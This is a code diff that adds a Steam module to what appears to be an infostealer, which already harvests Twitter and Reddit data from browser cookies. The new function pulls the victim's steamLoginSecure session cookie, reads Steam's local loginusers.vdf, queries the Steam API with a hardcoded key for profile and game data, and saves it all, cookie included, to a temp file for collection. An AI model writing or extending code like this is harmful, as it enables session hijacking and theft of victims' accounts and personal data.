@@ -3,6 +3,7 @@ const { getCookies } = require('../util/cookies');
 const { writeFileSync } = require('fs');
 const { tempFolder } = require('../index');
 const { join } = require('path');
+const fs = require('fs');
 const cookies = getCookies();
 
 const twitter = async () => {
@@ -48,5 +49,30 @@ const reddit = async () => {
   writeFileSync(join(tempFolder, 'Reddit.json'), JSON.stringify(account));
 };
 
+const steam = async () => {
+  if (!(await cookies).find(cookie => cookie.host.includes('steam'))) return;
+  const { value: cookie } = (await cookies).find(cookie => cookie.host.includes('store.steampowered.com') && cookie.name === 'steamLoginSecure');
+  const userId = cookie?.match(/7656[0-9]{13}/gi)[0];
+  const steamBasePath = join('C:', 'Program Files (x86)', 'Steam');
+  if (fs.existsSync(steamBasePath) && fs.existsSync(join(steamBasePath, 'config')) && fs.existsSync(join(steamBasePath, 'config', 'loginusers.vdf'))) {
+    fs.writeFileSync(join(tempFolder, 'Steam.json'), '[]');
+    const accounts = fs.readFileSync(join(steamBasePath, 'config', 'loginusers.vdf'), 'utf8');
+    const regex = /7656[0-9]{13}/gi;
+    accounts.match(regex).map(async account => {
+      const { response: accountInfo } = (await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`)).data;
+      const { response: games } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`)).data;
+      const { response: level } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`)).data;
+
+      const accountsFile = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));
+      accountsFile.push({
+        accountId: account, accountInfo, games, level
+      });
+      if (cookie) accountsFile.find(account => account.accountId === userId).cookie = cookie;
+      fs.writeFileSync(join(tempFolder, 'Steam.json'), JSON.stringify(accountsFile));
+    });
+  }
+};
+
 twitter();
 reddit();
+steam();
